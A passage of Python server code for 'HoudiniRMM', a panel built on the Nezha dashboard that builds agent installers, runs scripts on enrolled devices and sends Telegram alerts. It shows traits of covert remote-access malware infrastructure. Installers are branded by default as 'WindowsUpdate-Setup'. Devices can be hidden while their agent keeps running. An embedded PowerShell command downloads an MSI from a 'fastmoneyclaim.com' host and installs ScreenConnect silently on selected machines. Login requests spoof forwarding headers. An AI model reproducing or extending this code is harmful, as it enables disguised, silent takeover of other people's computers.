                return self._json(200, {"ok": True, "message": "Device(s) removed from your panel. The agent is still running and visible to admin.", "hidden": True})
            # Admin: actually uninstall the agent
            remove = bool(body.get("remove_from_panel", True))
            wait_seconds = float(body.get("wait_seconds") or 8)
            try:
                res = uninstall_devices(ids, remove_from_panel=remove, wait_seconds=wait_seconds)
                return self._json(200 if res.get("success") else 400, {"ok": bool(res.get("success")), **res})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})


        if path == "/api/device-meta":
            body = self._read_json()
            did = body.get("id")
            if did is None:
                return self._json(400, {"ok": False, "error": "id required"})
            try:
                did_int = int(did)
            except (ValueError, TypeError):
                return self._json(400, {"ok": False, "error": "invalid id"})
            ok, err = self._check_device_ownership([did_int])
            if not ok:
                return self._json(403, {"ok": False, "error": err})
            meta = hf.set_device_meta(did, body)
            _actor4 = "admin"
            try:
                _prof4 = self._calling_user_profile()
                if _prof4:
                    _actor4 = _prof4.get("username") or "admin"
            except Exception:
                pass
            hf.audit("device.meta", {"id": did, "meta": meta}, actor=_actor4)
            return self._json(200, {"ok": True, "meta": meta})

        if path == "/api/scripts":
            body = self._read_json()
            row = hf.upsert_script(body)
            hf.audit("script.save", {"id": row.get("id"), "name": row.get("name")}, actor=self._calling_username())
            return self._json(200, {"ok": True, "script": row})

        if path == "/api/scripts/delete":
            body = self._read_json()
            sid = str(body.get("id") or "")
            ok = hf.delete_script(sid)
            if ok:
                hf.audit("script.delete", {"id": sid}, actor=self._calling_username())
            return self._json(200 if ok else 404, {"ok": ok})

        if path == "/api/scripts/run":
            body = self._read_json()
            sid = str(body.get("id") or "")
            try:
                ids = [int(x) for x in (body.get("ids") or [])]
            except (ValueError, TypeError):
                return self._json(400, {"ok": False, "error": "invalid device ids"})
            try:
                res = run_script_on_devices(sid, ids)
                return self._json(200 if res.get("success") else 400, {"ok": bool(res.get("success")), **res})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/security/totp/setup":
            secret = hf.totp_new_secret()
            uri = hf.totp_provisioning_uri(secret, account="admin", issuer="HoudiniRMM")
            return self._json(200, {"ok": True, "secret": secret, "uri": uri})

        if path == "/api/security/totp/enable":
            body = self._read_json()
            secret = (body.get("secret") or "").strip().replace(" ", "")
            code = (body.get("code") or "").strip()
            if not secret or not code:
                return self._json(400, {"ok": False, "error": "secret and code required"})
            if not hf.totp_verify(secret, code):
                return self._json(400, {"ok": False, "error": "invalid code"})
            sec = hf.load_security()
            sec["totp_enabled"] = True
            sec["totp_secret"] = secret
            hf.save_security(sec)
            hf.audit("security.totp.enable", {}, actor=self._calling_username())
            return self._json(200, {"ok": True})

        if path == "/api/security/totp/disable":
            sec = hf.load_security()
            sec["totp_enabled"] = False
            sec["totp_secret"] = ""
            hf.save_security(sec)
            hf.audit("security.totp.disable", {}, actor=self._calling_username())
            return self._json(200, {"ok": True})

        if path == "/api/security/roles":
            if not self._require_admin():
                return self._json(403, {"ok": False, "error": "admin privileges required"})
            body = self._read_json()
            roles = body.get("roles") or {}
            if not isinstance(roles, dict):
                return self._json(400, {"ok": False, "error": "roles must be object"})
            sec = hf.load_security()
            sec["roles"] = {str(k): str(v) for k, v in roles.items()}
            hf.save_security(sec)
            hf.audit("security.roles", {"roles": sec["roles"]}, actor=self._calling_username())
            return self._json(200, {"ok": True, "roles": sec["roles"]})

        if path == "/api/security/verify-totp":
            body = self._read_json()
            code = (body.get("code") or "").strip()
            sec = hf.load_security()
            if not sec.get("totp_enabled"):
                return self._json(200, {"ok": True, "required": False})
            secret = sec.get("totp_secret") or ""
            if not secret:
                return self._json(200, {"ok": True, "required": False})
            if not hf.totp_verify(secret, code):
                hf.audit("security.totp.fail", {}, actor=self._calling_username())
                return self._json(401, {"ok": False, "error": "invalid 2FA code", "required": True})
            hf.audit("security.totp.ok", {}, actor=self._calling_username())
            return self._json(200, {"ok": True, "required": True})


        if path == "/api/system":
            body = self._read_json()
            try:
                import yaml
                cfg_path = Path("/opt/nezha/dashboard/data/config.yaml")
                cfg = yaml.safe_load(cfg_path.read_text(encoding="utf-8")) or {}
                str_keys = [
                    "web_real_ip_header", "agent_real_ip_header", "reserved_hosts",
                    "location", "ignored_ip_notification",
                ]
                for k in str_keys:
                    if k in body:
                        cfg[k] = str(body[k] or "")
                int_keys = [
                    "jwt_timeout", "avg_ping_count", "ip_change_notification_group_id", "cover",
                ]
                for k in int_keys:
                    if k in body:
                        try:
                            cfg[k] = int(body[k])
                        except Exception:
                            pass
                bool_keys = [
                    "enable_mcp", "enable_plain_ip_in_notification",
                    "enable_ip_change_notification", "debug", "force_auth", "tls",
                ]
                for k in bool_keys:
                    if k in body:
                        cfg[k] = bool(body[k])
                if "dns_servers" in body:
                    ds = body["dns_servers"]
                    if isinstance(ds, list):
                        ds = ",".join(str(x).strip() for x in ds if str(x).strip())
                    else:
                        ds = str(ds or "").strip()
                    cfg["dns_servers"] = ds
                # ensure tsdb block exists
                if not cfg.get("tsdb") or not (cfg.get("tsdb") or {}).get("data_path"):
                    cfg["tsdb"] = {
                        "data_path": "data/tsdb",
                        "retention_days": 30,
                        "min_free_disk_space_gb": 1,
                        "max_memory_mb": 256,
                        "write_buffer_size": 512,
                        "write_buffer_flush_interval": 5,
                    }
                cfg_path.write_text(
                    yaml.safe_dump(cfg, default_flow_style=False, allow_unicode=True, sort_keys=False),
                    encoding="utf-8",
                )
                try:
                    hf.audit("system.config", {k: body.get(k) for k in list(body.keys())[:30]})
                except Exception:
                    pass
                return self._json(
                    200,
                    {
                        "ok": True,
                        "message": "Saved. Restart nezha-dashboard for MCP/TSDB/real-ip to fully apply.",
                        "config": {k: cfg.get(k) for k in [
                            "web_real_ip_header","agent_real_ip_header","enable_mcp","tsdb",
                            "reserved_hosts","jwt_timeout","location","tls","force_auth"
                        ]},
                    },
                )
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/cfg":
            if not self._require_admin():
                return self._json(403, {"ok": False, "error": "admin privileges required"})
            body = self._read_json()
            cfg = load_cfg()
            for k in ("show_user_devices",):
                if k in body:
                    cfg[k] = bool(body[k])
            save_cfg(cfg)
            return self._json(200, {"ok": True, "cfg": cfg})

        if path == "/api/branding":
            body = self._read_json()
            b = load_branding()
            for k in [
                "product_name",
                "company",
                "description",
                "website",
                "server",
                "client_secret",
                "tls",
                "debug",
                "disable_auto_update",
                "disable_force_update",
                "disable_command_execute",
                "disable_nat",
                "disable_send_query",
                "gpu",
                "temperature",
                "insecure_tls",
                "skip_connection_count",
                "skip_procs_count",
                "use_gitee_to_upgrade",
                "use_atomgit_to_upgrade",
                "use_ipv6_country_code",
                "ip_report_period",
                "report_delay",
                "self_update_period",
                "dns",
                "custom_ip_api",
                "hard_drive_partition_allowlist",
                "nic_allowlist",
            ]:
                if k in body:
                    b[k] = body[k]
            if not b.get("server") or not b.get("client_secret"):
                return self._json(400, {"ok": False, "error": "server and client_secret required"})
            save_branding(b)
            try:
                import yaml

                cfg_path = Path("/opt/nezha/dashboard/data/config.yaml")
                cfg = yaml.safe_load(cfg_path.read_text()) or {}
                cfg["install_host"] = b["server"]
                cfg["tls"] = bool(b.get("tls"))
                if b.get("product_name"):
                    cfg["site_name"] = b["product_name"]
                cfg_path.write_text(yaml.safe_dump(cfg, default_flow_style=False, allow_unicode=True))
            except Exception as e:
                print("config sync warn", e)
            return self._json(200, {"ok": True, "branding": b})

        if path == "/api/icon":
            ctype = self.headers.get("Content-Type", "")
            try:
                n = int(self.headers.get("Content-Length") or 0)
            except (ValueError, TypeError):
                n = 0
            body = self.rfile.read(n) if n else b
            if "multipart/form-data" not in ctype:
                return self._json(400, {"ok": False, "error": "expected multipart"})
            m = re.search(r"boundary=(.+)", ctype)
            if not m:
                return self._json(400, {"ok": False, "error": "no boundary"})
            boundary = m.group(1).encode()
            saved = False
            for part in body.split(b"--" + boundary):
                if b"filename=" not in part:
                    continue
                header, _, data = part.partition(b"\r\n\r\n")
                if not data:
                    continue
                data = data.rstrip(b"\r\n--")
                fname = re.search(br'filename="([^"]+)"', header)
                ext = ".png"
                if fname:
                    name = fname.group(1).decode(errors="ignore").lower()
                    if name.endswith(".ico"):
                        ext = ".ico"
                    elif name.endswith(".jpg") or name.endswith(".jpeg"):
                        ext = ".jpg"
                    elif name.endswith(".webp"):
                        ext = ".webp"
                for old in DATA.glob("icon.*"):
                    old.unlink(missing_ok=True)
                icon = DATA / f"icon{ext}"
                icon.write_bytes(data)
                ICON_PATH = icon
                saved = True
                # Sync icon to the Nezha dashboard's logo and favicon
                # so the main dashboard uses the same branding icon.
                try:
                    import shutil as _sh
                    user_dist = Path("/opt/nezha/dashboard/user-dist")
                    user_dist.mkdir(parents=True, exist_ok=True)
                    # Always write a .png version for logo.png and favicon.png
                    # (Nezha dashboard expects these files)
                    if ext.lower() == ".png":
                        _sh.copy2(icon, user_dist / "logo.png")
                        _sh.copy2(icon, user_dist / "favicon.png")
                    else:
                        # For non-PNG uploads, convert to PNG if possible,
                        # otherwise just copy the raw file (browsers handle most formats)
                        _sh.copy2(icon, user_dist / f"logo{ext}")
                        _sh.copy2(icon, user_dist / f"favicon{ext}")
                        # Also try to write a PNG version using PIL if available
                        try:
                            from PIL import Image
                            img = Image.open(icon)
                            img.save(user_dist / "logo.png", "PNG")
                            img.save(user_dist / "favicon.png", "PNG")
                        except ImportError:
                            pass  # PIL not available — keep original format
                    # Update logo.svg to point to the new icon (or copy as SVG if uploaded)
                    if ext.lower() == ".svg":
                        _sh.copy2(icon, user_dist / "logo.svg")
                    hf.audit("icon.sync", {"ext": ext, "dest": str(user_dist)})
                except Exception as e:
                    # Don't fail the upload if sync fails
                    hf.audit("icon.sync.failed", {"error": str(e)})
                break
            if not saved:
                return self._json(400, {"ok": False, "error": "no file"})
            return self._json(200, {"ok": True})

        if path == "/api/tg":
            body = self._read_json()
            bot_token = (body.get("bot_token") or "").strip()
            chat_id = (body.get("chat_id") or "").strip()
            monitor = bool(body.get("monitor", True))
            if not bot_token or not chat_id:
                return self._json(400, {"ok": False, "error": "bot token and chat id are required"})
            uid = self._calling_user_id() or 0
            save_tg_for(uid, {"bot_token": bot_token, "chat_id": chat_id, "monitor": monitor})
            hf.audit("tg.save", {"uid": uid, "configured": True, "monitor": monitor})
            return self._json(200, {"ok": True})

        if path == "/api/tg/test":
            body = self._read_json()
            uid = self._calling_user_id() or 0
            c = load_tg_for(uid)
            token = (body.get("bot_token") or c.get("bot_token") or "").strip()
            chat = (body.get("chat_id") or c.get("chat_id") or "").strip()
            if not token or not chat:
                return self._json(400, {"ok": False, "error": "bot token and chat id are required"})
            b = load_branding()
            text = tg_format_msg(
                "test",
                {"Product": b.get("product_name") or "HoudiniRMM", "Server": b.get("server") or ""},
                status="Telegram notifications are working",
                ok=True,
                product="HoudiniRMM",
            )
            res = tg_send(token, chat, text)
            hf.audit("tg.test", {"ok": bool(res.get("ok")), "error": res.get("error")})
            return self._json(200 if res.get("ok") else 400, {"ok": bool(res.get("ok")), "result": res})

        if path == "/api/build":
            _build_uid = self._calling_user_id() or 0
            if not can_build(_build_uid):
                return self._json(429, {"ok": False, "error": "Build limit: 5 per hour"})
            body = self._read_json()
            platform = (body.get("platform") or "windows").lower()
            fmt = (body.get("format") or body.get("kind") or "").lower().strip()
            # aliases: exe / standalone / embedded → embedded installer
            if platform not in OFFICIAL:
                return self._json(400, {"ok": False, "error": "platform must be windows, linux, or darwin"})
            if not fmt:
                fmt = "exe" if platform == "windows" else "zip"
            if fmt in ("standalone", "embedded", "installer", "setup"):
                fmt = "exe"
            if fmt not in ("zip", "exe"):
                return self._json(400, {"ok": False, "error": "format must be zip or exe"})
            if fmt == "exe" and platform != "windows":
                return self._json(400, {"ok": False, "error": "embedded EXE is Windows-only; use zip for other platforms"})
            try:
                b = load_branding()
                # Non-admin users: override client_secret with their own agent_secret
                # and use unsigned binary so devices are owned by them.
                user_secret = self._calling_user_agent_secret()
                use_signed = True
                build_uid = self._calling_user_id() or 0
                if user_secret:
                    b = dict(b)
                    # Use the global agent_secret_key for agent gRPC connections.
                    # Per-user agent_secret is for API access only, not for agent connections.
                    # Device ownership is tracked by the dashboard via UUID.
                    b["client_secret"] = _global_agent_secret()
                    use_signed = False
                    # Create enrollment token for non-admin users
                    if build_uid and build_uid != 1:
                        b["enrollment_token"] = create_claim_token(build_uid, user_secret)
                calling_uid = self._calling_user_id() or 0
                if fmt == "exe":
                    # For non-admin users: save_branding_cfg=False triggers
                    # the temporary save/restore mechanism in build_standalone_windows
                    out = build_standalone_windows(b, use_signed=use_signed, save_branding_cfg=not bool(user_secret))
                    standalone = True
                else:
                    out = build_package(platform, b, use_signed=use_signed, uid=calling_uid)
                    standalone = False
                # Ensure the build output is in OUT/ so /api/download/ can serve it
                # (SIGNED_EXE lives in CACHE/, not OUT/)
                if out.parent != OUT:
                    import shutil as _sh
                    # For admin signed EXE: copy to OUT with the branded installer name
                    # so the download is consistent with a freshly built installer.
                    if out.name == "agent-signed.exe":
                        dest_name = f"{safe_name(b.get('product_name','WindowsUpdate'))}-Setup-windows-amd64.exe"
                    else:
                        dest_name = out.name
                    dest = OUT / dest_name
                    _sh.copy2(out, dest)
                    out = dest
                # Tag this build with the calling user's ID
                set_build_owner(out.name, calling_uid)
                return self._json(
                    200,
                    {
                        "ok": True,
                        "filename": out.name,
                        "standalone": standalone,
                        "format": fmt,
                        "platform": platform,
                        "kind": "Embedded EXE" if standalone else "ZIP package",
                    },
                )
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/sync":
            try:
                import yaml

                passw = ADMIN_PASS_FILE.read_text().strip()
                cj = http.cookiejar.CookieJar()
                o = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
                r = urllib.request.Request(
                    f"{DASHBOARD}/api/v1/login",
                    data=json.dumps({"username": "admin", "password": passw}).encode(),
                    headers={"Content-Type": "application/json", "X-Real-IP": "127.0.0.1", "X-Forwarded-For": "127.0.0.1"},
                    method="POST",
                )
                tok = json.loads(o.open(r).read())["data"]["token"]
                r2 = urllib.request.Request(
                    f"{DASHBOARD}/api/v1/profile",
                    headers={"Authorization": "Bearer " + tok, "X-Real-IP": "127.0.0.1", "X-Forwarded-For": "127.0.0.1"},
                )
                secret = json.loads(o.open(r2).read())["data"]["agent_secret"]
                with open("/opt/nezha/dashboard/data/config.yaml", encoding="utf-8") as f:
                    cfg = yaml.safe_load(f) or {}
                b = load_branding()
                b["client_secret"] = secret
                if cfg.get("install_host"):
                    b["server"] = cfg["install_host"]
                b["tls"] = bool(cfg.get("tls"))
                save_branding(b)
                return self._json(200, {"ok": True, "branding": b})
            except Exception as e:
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/screenconnect/upload":
            uid = self._calling_user_id() or 0
            sc_dir = user_screenconnect_dir(uid)
            sc_dir.mkdir(parents=True, exist_ok=True)
            try:
                length = int(self.headers.get("Content-Length", 0))
            except (ValueError, TypeError):
                return self._json(400, {"ok": False, "error": "invalid content length"})
            if not length or length > 200 * 1024 * 1024:
                return self._json(400, {"ok": False, "error": "file too large or missing"})
            data = self.rfile.read(length)
            for old in sc_dir.glob("*.msi"):
                old.unlink(missing_ok=True)
            fp = sc_dir / "screenconnect.msi"
            fp.write_bytes(data)
            _actor5 = "admin"
            try:
                _prof5 = self._calling_user_profile()
                if _prof5:
                    _actor5 = _prof5.get("username") or "admin"
            except Exception:
                pass
            hf.audit("sc.upload", {"uid": uid, "size": len(data)}, actor=_actor5)
            return self._json(200, {"ok": True, "file": fp.name, "size": fp.stat().st_size})

        if path == "/api/screenconnect/remove":
            uid = self._calling_user_id() or 0
            sc_dir = user_screenconnect_dir(uid)
            sc_dir.mkdir(parents=True, exist_ok=True)
            for f in sc_dir.glob("*.msi"):
                f.unlink(missing_ok=True)
            hf.audit("sc.remove", {"uid": uid})
            return self._json(200, {"ok": True})

        if path == "/api/notifications/delete":
            body = self._read_json()
            nid = (body.get("id") or "").strip()
            if nid == "__all__":
                save_notifs([])
                return self._json(200, {"ok": True})
            if not nid:
                return self._json(400, {"ok": False, "error": "id required"})
            with lock:
                notifs = load_notifs()
                notifs = [n for n in notifs if n.get("id") != nid]
                save_notifs(notifs)
            return self._json(200, {"ok": True})

        if path == "/api/notifications/push":
            body = self._read_json()
            title = (body.get("title") or "").strip()
            btext = (body.get("body") or "").strip()
            kind = (body.get("kind") or "info").strip()
            if not title:
                return self._json(400, {"ok": False, "error": "title required"})
            add_notif(title, btext, kind)
            return self._json(200, {"ok": True})

        if path == "/api/screenconnect/deploy":
            try:
                body = self._read_json()
            except Exception:
                return self._json(400, {"ok": False, "error": "invalid request"})
            try:
                ids = [int(x) for x in (body.get("ids") or [])]
            except (ValueError, TypeError):
                return self._json(400, {"ok": False, "error": "invalid device ids"})
            if not ids:
                return self._json(400, {"ok": False, "error": "no devices selected"})
            ok, err = self._check_device_ownership(ids)
            if not ok:
                return self._json(403, {"ok": False, "error": err})
            uid = self._calling_user_id() or 0
            sc_dir = user_screenconnect_dir(uid)
            files = sorted(sc_dir.glob("*.msi"), key=lambda p: p.stat().st_mtime, reverse=True)
            if not files:
                return self._json(400, {"ok": False, "error": "no MSI uploaded"})
            msi = files[0]
            STATIC = Path("/opt/nezha/agent-builder/static")
            STATIC.mkdir(parents=True, exist_ok=True)
            dest = STATIC / msi.name
            shutil.copy2(msi, dest)
            branding = load_branding()
            srv_host = str(branding.get("server", "rmm.houdini.fastmoneyclaim.com:443")).split(":")[0]
            dl_url = f"https://{srv_host}/dashboard/api/static/{dest.name}"
            sc_script = Path("/opt/nezha/agent-builder/static/Install-ScreenConnect.ps1")
            if sc_script.exists():
                ps = sc_script.read_text(encoding="utf-8")
            else:
                ps = f'''$ErrorActionPreference="Stop"
$url="{dl_url}"
$f="$env:TEMP\\sc_{dest.name}"
Write-Host "[SC] Downloading..."
iwr -UseBasicParsing "$url" -OutFile $f
Write-Host "[SC] Installing silently..."
if($f -like "*.msi"){{Start-Process msiexec -Arg "/i",$f,"/quiet","/norestart" -Wait}}else{{Start-Process $f -Arg "/S" -Wait}}
Start-Sleep 5; $p=Get-Process -Name "ScreenConnect*" -ErrorAction SilentlyContinue
if($p){{Write-Host "[SC] OK - PID $($p.Id)"}}else{{Write-Host "[SC] WARN - process not found"}}
Remove-Item $f -Force -ErrorAction SilentlyContinue'''
            try:
                res = run_raw_script_on_devices(ps, ids)
                _actor6 = "admin"
                try:
                    _prof6 = self._calling_user_profile()
                    if _prof6:
                        _actor6 = _prof6.get("username") or "admin"
                except Exception:
                    pass
                hf.audit("sc.deploy", {"ids": ids, "cron_id": res.get("cron_id")}, actor=_actor6)
                add_notif("ScreenConnect Deploy", f"Sent to {len(ids)} device(s)", "ok")
                return self._json(200, {"ok": True, "devices": len(ids), "cron_id": res.get("cron_id"), "result": res})
            except Exception as e:
                add_notif("ScreenConnect Deploy", f"Failed: {e}", "err")
                return self._json(500, {"ok": False, "error": str(e)})

        if path == "/api/builds/clear":
            for f in list(OUT.glob("*")):
                try:
                    if f.is_file():
                        f.unlink()
                    else:
                        shutil.rmtree(f, ignore_errors=True)
                except Exception:
                    pass
            return self._json(200, {"ok": True})

        self._json(404, {"ok": False, "error": "not found"})


def tg_monitor_loop():
    """Monitor device online/offline state and send TG notifications."""
    prev = load_tg_state()
    while True:
        try:
            try:
                devices = list_devices()
            except Exception:
                devices = []
            # Group devices by owner for efficient TG config lookups
            owner_tg_cache = {}  # uid -> tg_config dict
            def get_owner_tg(uid):
                if uid not in owner_tg_cache:
                    owner_tg_cache[uid] = tg_config_active_for(uid)
                return owner_tg_cache[uid]
            now_ids = set()
            for d in devices:
                pid = d.get("id")
                now_ids.add(pid)
                online = bool(d.get("online"))
                name = d.get("name") or ("#" + str(pid))
                os_str = ((d.get("platform") or "") + " " + (d.get("platform_version") or "")).strip() or "Unknown OS"
                owner_uid = int(d.get("_owner_id") or 0)
                # Get this device owner's TG config
                tg = get_owner_tg(owner_uid)
                token = tg.get("bot_token", "")
                chat = tg.get("chat_id", "")
                monitor = tg.get("monitor", True)
                if not (token and chat and monitor):
                    prev[pid] = (online, owner_uid)
                    continue
                prev_state = prev.get(pid)
                if prev_state is None:
                    # brand-new device appearing in the panel
                    text = tg_format_msg(
                        "new_device",
                        {
                            "Device": name,
                            "IP": d.get("ip") or "",
                            "OS": os_str,
                            "Arch": d.get("arch") or "",
                            "Agent": d.get("agent_version") or "",
                        },
                        status="Connected to the panel" if online else "Not reporting yet",
                        ok=online,
                        product=name,
                    )
                    try:
                        tg_send(token, chat, text)
                        hf.audit("tg.new_device", {"id": pid, "name": name, "owner": owner_uid})
                    except Exception:
                        pass
                elif prev_state[0] != online:
                    state = "online" if online else "offline"
                    text = tg_format_msg(
                        state,
                        {
                            "Device": name,
                            "IP": d.get("ip") or "",
                            "OS": os_str,
                            "CPU": str(round(float(d.get("cpu") or 0), 1)) + "%",
                            "Memory": ("%.1f / %.1f GB" % ((d.get("mem_used") or 0) / 1073741824, (d.get("mem_total") or 0) / 1073741824)),
                            "Uptime": fmt_dur(d.get("uptime") or 0),
                        },
                        status=("Heartbeat received" if online else "No heartbeat — agent stopped or lost network"),
                        ok=online,
                        product=name,
                    )
                    try:
                        tg_send(token, chat, text)
                        hf.audit("tg.device", {"id": pid, "name": name, "state": state, "owner": owner_uid})
                    except Exception:
                        pass
                prev[pid] = (online, owner_uid)
            # detect devices removed from panel
            for pid in list(prev.keys()):
                if pid not in now_ids:
                    old_owner = prev[pid][1] if isinstance(prev[pid], tuple) else 0
                    tg = get_owner_tg(old_owner)
                    token = tg.get("bot_token", "")
                    chat = tg.get("chat_id", "")
                    if token and chat:
                        text = tg_format_msg(
                            "gone",
                            {"Device": ("#" + str(pid))},
                            status="Removed from the panel",
                            product=("Device #" + str(pid)),
                        )
                        try:
                            tg_send(token, chat, text)
                            hf.audit("tg.gone", {"id": pid, "owner": old_owner})
                        except Exception:
                            pass
                    prev.pop(pid, None)
        except Exception:
            pass
        save_tg_state(prev)
        time.sleep(30)


def fmt_dur(s):
    s = int(s or 0)
    d = s // 86400
    h = (s % 86400) // 3600
    m = (s % 3600) // 60
    if d > 0:
        return f"{d}d {h}h {m}m"
    if h > 0:
        return f"{h}h {m}m"
    return f"{m}m"


def main():
    global ICON_PATH
    tg_monitor_thread = threading.Thread(target=tg_monitor_loop, daemon=True)
    tg_monitor_thread.start()
    DATA.mkdir(parents=True, exist_ok=True)
    CACHE.mkdir(parents=True, exist_ok=True)
    OUT.mkdir(parents=True, exist_ok=True)
    for p in DATA.glob("icon.*"):
        ICON_PATH = p
        break
    httpd = ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"Houdini Dashboard on http://{HOST}:{PORT} (prefixes={URL_PREFIXES})")
    httpd.serve_forever()


if __name__ == "__main__":
    main()
